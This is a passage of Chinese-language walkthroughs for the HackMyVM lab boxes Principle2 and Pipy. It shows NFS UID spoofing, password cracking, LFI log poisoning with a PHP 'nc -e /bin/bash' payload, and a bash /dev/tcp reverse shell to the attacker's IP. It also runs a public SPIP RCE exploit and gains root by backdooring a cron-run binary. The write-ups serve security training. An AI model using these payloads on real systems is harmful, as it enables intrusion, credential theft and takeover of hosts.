└─$ showmount -e 192.168.205.247
Export list for 192.168.205.247:
/var/backups *
/home/byron  *
                     
```

ps:*挂载记得要用sudo，不然它会报错*

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo mount -t nfs 192.168.205.247:/var/backups /home/kali/test/tmp/backup
[sudo] kali 的密码：
                                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd backup 
cd: 权限不够: backup
             
┌──(kali㉿kali)-[~/test/tmp]
└─$ sudo mount -t nfs 192.168.205.247:/home/byron /home/kali/test/tmp/home

┌──(kali㉿kali)-[~/test/tmp]
└─$ cd home
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ ls
mayor.txt  memory.txt
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cat mayor.txt 
Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cat memory.txt
Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
                                        
# mayor.txt翻译
现在我已经是市长了，我觉得赫曼努比斯正在密谋反对我，我猜他有一个秘密组织并且把它隐藏起来。

# memory.txt翻译     
赫曼努比斯告诉我，他忘记了密码，无法更改，谢天谢地，我保存了每个邻居的号码和十六进制密码记录。我认为他会成为新耶路撒冷的好市长。                                                
```

告诉我们他保存了每个邻居的号码和十六进制密码记录，应该就在我们看不了那个文件夹，我们去查看一下它的权限

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 52
drwxrwxr-x  4 kali kali    4096  1月12日 10:26 .
drwxrwxr-x 31 kali kali   12288  1月12日 10:03 ..
drwxr--r--  2   54 backup 28672 2023年11月29日 backup
drwxr-xr-x  3 1001   1001  4096 2023年11月26日 home

```

创建具有相同 UID 的用户进行访问：

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ sudo useradd -u 54 hack
useradd warning: hack's uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.
                                  
┌──(kali㉿kali)-[~/test/tmp]
└─$ su hack           
密码： 
$ bash
hack@kali:/home/kali/test/tmp$ cd backup/
hack@kali:/home/kali/test/tmp/backup$ ls
(这里省略)

hack@kali:/home/kali/test/tmp/backup$ cat *.txt
(这里省略)

```

我们将十六进制尝试恢复一下

```bash
hack@kali:/home/kali/test/tmp/backup$ cat *.txt &gt; /tmp/a.txt
hack@kali:/home/kali/test/tmp/backup$ su kali
密码： 

┌──(kali㉿kali)-[~/test/tmp/backup]
└─$ cp /tmp/a.txt ~/test/a.txt
                              
┌──(kali㉿kali)-[~/test]
└─$ xxd -ps -r a.txt | strings
(这里省略)
ByronIsAsshole
(这里省略)                
```

获得了一个类似密码的东西，它没有开放ssh端口，那就只可能是smb服务的密码了

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.247// -N                       

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      New Jerusalem Public
        hermanubis      Disk      Hermanubis share
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.205.247 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.247/hermanubis -U hermanubis
Password for [WORKGROUP\hermanubis]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Nov 28 22:44:44 2023
  ..                                  D        0  Wed Nov 29 09:13:50 2023
  index.html                          N      346  Tue Nov 28 22:44:41 2023
  prometheus.jpg                      N   307344  Wed Nov 29 01:23:24 2023

                19962704 blocks of size 1024. 17151324 blocks available
smb: \&gt; get index.html 
getting file \index.html of size 346 as index.html (15.4 KiloBytes/sec) (average 15.4 KiloBytes/sec)
smb: \&gt; get prometheus.jpg 
getting file \prometheus.jpg of size 307344 as prometheus.jpg (11543.8 KiloBytes/sec) (average 6260.0 KiloBytes/sec)
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat index.html 
&lt;!DOCTYPE html&gt;
&lt;html lang='es'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;
    &lt;title&gt;Welcome to the resistance forum&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;h1&gt;Welcome to the resistance forum&lt;/h1&gt;

    &lt;p&gt;free our chains!&lt;/p&gt;

    &lt;img src='prometheus.jpg' alt='chained'&gt;

&lt;/body&gt;
&lt;/html&gt;
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ exiftool prometheus.jpg   
ExifTool Version Number         : 13.00
File Name                       : prometheus.jpg
Directory                       : .
File Size                       : 307 kB
File Modification Date/Time     : 2025:01:12 12:33:09+08:00
File Access Date/Time           : 2025:01:12 12:33:09+08:00
File Inode Change Date/Time     : 2025:01:12 12:33:09+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1920x1080
Megapixels                      : 2.1
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ stegseek prometheus.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: 'soldierofanubis'   
[i] Original filename: 'secret.txt'.
[i] Extracting to 'prometheus.jpg.out'.

                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat prometheus.jpg.out
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
                                                                                                                                                                                              
```

图片里隐藏了一个域名，加入我们的hosts中

![image](https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f)

此地无银三百两，爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thetruthoftalos.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 169] [--&gt; http://thetruthoftalos.hmv/uploads/]
/index.html           (Status: 200) [Size: 8]
/index.php            (Status: 200) [Size: 1970]
Progress: 51629 / 311425 (16.58%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53720 / 311425 (17.25%)
===============================================================
Finished
===============================================================

```

`index.php`大小明显不一样

![image](https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70)

你在输入框中输入点东西，你就会发现一些有趣的东西

![image](https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67)

看着就像有**本地文件包含漏洞**

![image](https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354)

回显不对，应该要**双重绕过**

![image](https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037)

成功获得`/etc/passwd`，因为没有ssh端口，所以尝试一下日志包含，我们看一下它的架构

![image](https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09)

```bash
/var/log/nginx/access.log
/var/log/nginx/error.log
```

![image](https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82)

可以回显，我们构造一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://thetruthoftalos.hmv/shell -H 'User-Agent: &lt;?php exec('nc -e /bin/bash 192.168.205.141 8888')  ?&gt;'
&lt;html&gt;
&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.22.1&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://thetruthoftalos.hmv/index.php?filename=....//....//....//....///var/log/nginx/access.log       


```

卡住就是弹回来了

---

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.提权

上来以后转了一圈都没发现什么有意思的东西，我就直接甩了一个linpeas.sh上来了,也无果，但是查看pspy看定时任务的时候发现了这个

![image](https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b)

但是我们没有修改的权限

```bash
www-data@principle2:/tmp$ ls -la /usr/local/share/report
-rwxrwx--- 1 root talos 16584 Nov 25  2023 /usr/local/share/report

principle2:/home/talos$ sudo -u talos cat /usr/local/share/report &gt; /tmp/report
www-data@principle2:/home/talos$ cd /tmp/
www-data@principle2:/tmp$ cat report &gt; /dev/tcp/192.168.205.141/7777
```

拷过来看看具体运行什么

```bash
┌──(kali㉿kali)-[~/test]
└─$ strings report 
/lib64/ld-linux-x86-64.so.2
fgets
rewind
perror
fread
exit
fopen
strstr
pclose
__libc_start_main
__cxa_finalize
popen
fclose
fputs
fwrite
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
write www-data
You are not allowed to be here
Error sending message to www-data
/opt/users.txt
Error opening output file
Error executing 'who' command
www-data
New information appended to '/opt/users'
No new information to append
;*3$'
GCC: (Debian 13.2.0-5) 13.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
report.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
fread@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
rewind@GLIBC_2.2.5
pclose@GLIBC_2.2.5
fputs@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
notifyNotAllowed
__bss_start
main
popen@GLIBC_2.2.5
fopen@GLIBC_2.2.5
perror@GLIBC_2.2.5
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
strstr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
                       
```

没有发现什么明显利用点，想着拿之前的密码尝试登录的时候，发现有之前**SMB服务**的`hermanubis`用户（骂的很脏）

```bash
www-data@principle2:/tmp$ ls /home/
byron  city  hermanubis  melville  talos

www-data@principle2:/tmp$ su - hermanubis
Password: 
$ id
uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)
$ sudo -l
Matching Defaults entries for hermanubis on principle2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User hermanubis may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat

$ cd /home/hermanubis
$ ls
investigation.txt  share  user.txt
$ cat investigation.txt 
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...

# 翻译
我知道拜伦讨厌我……尤其是自从我忘记密码之后。
我和我的朋友们经过多次分析和攻击，发现梅尔维尔使用的密码是 32 个字符……
但他不知道的是，这个密码就在拜伦的数据库中……
```

Byron就是之前那个市长，32个字符就是那个16进制表，拿过来爆破一下就好了

```bash
$ cd /tmp
$ ./suForce -u melville -w a.txt 
            _____                        
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | melville
📖 Wordlist | a.txt
🔎 Status   | 54/1001/5%/1bd5528b6def9812acba8eb21562c3ec
💥 Password | 1bd5528b6def9812acba8eb21562c3ec
───────────────────────────────────


$ su - melville
Password: 
root is watching you, it has a record of all your steps:

melville@principle2:~$ id
uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)

```

melville用户有`talos`的权限，可以修改/usr/local/share/report文件，我们把bash加个权限就好了

```bash
melville@principle2:~$ vi /usr/local/share/report
melville@principle2:~$ cat /usr/local/share/report
#!/bin/bash
chmod +s /bin/bash
```

然后等就好了，等它定时任务触发

```bash
melville@principle2:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
melville@principle2:/tmp$ bash -p
bash-5.2# id
uid=1003(melville) gid=1003(melville) euid=0(root) egid=0(root) groups=0(root),1000(talos),1003(melville)

```

下班sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Principle2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:31 +0000</pubDate></item><item><title>hmv_Pipy</title><link>https://7r1UMPHK.github.io/post/hmv_Pipy.html</link><description># hmv_Pipy

# 0.简介

**靶机**：[hackmyvm - Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST
Nmap scan report for tiny.hmv (192.168.205.143)
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:47:C9:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

先看**80端口**，**22端口**候补

# 2.踩点

![Image](https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62)

扫描有没有漏洞（不得不说，群里面的web大佬**Anjv-W.**  推荐的扫洞工具就是好用，点赞👍）

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.143               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.online
[CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&amp;lang=fr
[waf-detect:apachegeneric] [http] [info] http://192.168.205.143
[openssh-detect] [tcp] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
[ssh-password-auth] [javascript] [info] 192.168.205.143:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ['['publickey','password']']
[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ['Vulnerable to Terrapin']
[composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json
[composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json
[metatag-cms] [http] [info] http://192.168.205.143 ['SPIP 4.2.0']
[readme-md] [http] [info] http://192.168.205.143/README.md
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.143
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143
[apache-detect] [http] [info] http://192.168.205.143 ['Apache/2.4.52 (Ubuntu)']
[spip-detect:spip_version] [http] [info] http://192.168.205.143 ['4.2.0']
[configuration-listing] [http] [medium] http://192.168.205.143/config/
```

有一个[CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517)漏洞，我们利用一下

![Image](https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12)

非授权远程执行更喜欢了🤩

```bash
git clone https://github.com/Chocapikk/CVE-2024-8517.git
cd CVE-2024-8517
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt 
┌──(env)─(kali㉿kali)-[~/test/tmp/CVE-2024-8517]
└─$ python3 exploit.py -u http://192.168.205.143          
✅ Target is vulnerable! Command Output: www-data
                                                                                                                                     
ℹ  Interactive shell started. Type `exit` to quit.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

deactivate #退出虚拟环境命令
rm -rf env #删除虚拟环境
```

成功，但是我们要弹个**反弹shell**回去，因为它这个脚本的shell有限制

```bash
$ bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@pipy:/var/www/html$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@pipy:/var/www/html$ ls -la
total 156
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 .
drwxr-xr-x  4 www-data www-data  4096 Oct  5  2023 ..
-rw-r--r--  1 www-data www-data  7045 Feb 23  2023 CHANGELOG.md
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 IMG
-rw-r--r--  1 www-data www-data 35147 Feb 23  2023 LICENSE
-rw-r--r--  1 www-data www-data   842 Feb 23  2023 README.md
-rw-r--r--  1 www-data www-data   178 Feb 23  2023 SECURITY.md
-rw-r--r--  1 www-data www-data  1761 Feb 23  2023 composer.json
-rw-r--r--  1 www-data www-data 27346 Feb 23  2023 composer.lock
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 config
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 ecrire
-rw-r--r--  1 www-data www-data  4307 Feb 23  2023 htaccess.txt
-rw-r--r--  1 www-data www-data    42 Feb 23  2023 index.php
drwxr-xr-x  5 www-data www-data  4096 Oct  3  2023 local
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 plugins-dist
-rw-r--r--  1 www-data www-data  3645 Feb 23  2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data  4096 Oct  3  2023 prive
-rw-r--r--  1 www-data www-data   973 Feb 23  2023 spip.php
-rw-r--r--  1 www-data www-data  1212 Feb 23  2023 spip.png
-rw-r--r--  1 www-data www-data  1673 Feb 23  2023 spip.svg
drwxr-xr-x 10 www-data www-data  4096 Oct  3  2023 squelettes-dist
drwxr-xr-x  5 www-data www-data  4096 Jan 18 02:35 tmp
drwxr-xr-x  6 www-data www-data  4096 Oct  3  2023 vendor
www-data@pipy:/var/www/html$ cd config/
www-data@pipy:/var/www/html/config$ ls -al
total 48
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess
-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok
-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php
-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php
-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php
-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
www-data@pipy:/var/www/html/config$ cat connect.php
&lt;?php
if (!defined('_ECRIRE_INC_VERSION')) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
www-data@pipy:/var/www/html/config$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 503
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; use spip;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [spip]&gt; show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)

MariaDB [spip]&gt; select * from spip_auteurs\G
*************************** 1. row ***************************
   id_auteur: 1
         nom: Angela
         bio: 
       email: angela@pipy.htb
    nom_site: 
    url_site: 
       login: angela
        pass: 4ng3l4
     low_sec: 
      statut: 0minirezo
   webmestre: oui
         maj: 2023-10-04 17:28:39
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 13:50:34
 alea_actuel: 387046876651c39a45bc836.13502903
  alea_futur: 465278670651d6da4349d85.01841245
       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
cookie_oubli: NULL
      source: spip
        lang: 
    imessage: 
 backup_cles: 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM=
*************************** 2. row ***************************
   id_auteur: 2
         nom: admin
         bio: 
       email: admin@pipy.htb
    nom_site: 
    url_site: 
       login: admin
        pass: $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2
     low_sec: 
      statut: 1comite
   webmestre: non
         maj: 2023-10-04 17:31:03
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 17:31:03
 alea_actuel: 1540227024651d7e881c21a5.84797952
  alea_futur: 439334464651da1526dbb90.67439545
       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=
      source: spip
        lang: fr
    imessage: oui
 backup_cles: 
2 rows in set (0.000 sec)
```

切换至`angela`

```bash
www-data@pipy:/var/www/html/config$ su - angela
Password: 
angela@pipy:~$ id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
```

继续提权

```bash
angela@pipy:~$ ls -la
total 40
drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
lrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
drwx------ 3 angela angela 4096 Oct  5  2023 .cache
drwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local
-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
drwx------ 3 angela angela 4096 Oct  3  2023 snap
drwx------ 2 angela angela 4096 Oct  2  2023 .ssh
-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful
-rw------- 1 angela angela   33 Oct  5  2023 user.txt
angela@pipy:~$ cd /opt/
angela@pipy:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/opt$ cd /tmp/
angela@pipy:/tmp$ ls -al
total 12
drwxrwxrwt  2 root     root     4096 Jan 18 02:44 .
drwxr-xr-x 19 root     root     4096 Oct  2  2023 ..
-rw-------  1 www-data www-data   19 Jan 18 02:44 phpMHrr6q
angela@pipy:/tmp$ cd /mnt/
angela@pipy:/mnt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/mnt$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
/snap/snapd/23545/usr/lib/snapd/snap-confine
/snap/snapd/20092/usr/lib/snapd/snap-confine
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core/17200/bin/mount
/snap/core/17200/bin/ping
/snap/core/17200/bin/ping6
/snap/core/17200/bin/su
/snap/core/17200/bin/umount
/snap/core/17200/usr/bin/chfn
/snap/core/17200/usr/bin/chsh
/snap/core/17200/usr/bin/gpasswd
/snap/core/17200/usr/bin/newgrp
/snap/core/17200/usr/bin/passwd
/snap/core/17200/usr/bin/sudo
/snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/17200/usr/lib/openssh/ssh-keysign
/snap/core/17200/usr/lib/snapd/snap-confine
/snap/core/17200/usr/sbin/pppd
/snap/core/16202/bin/mount
/snap/core/16202/bin/ping
/snap/core/16202/bin/ping6
/snap/core/16202/bin/su
/snap/core/16202/bin/umount
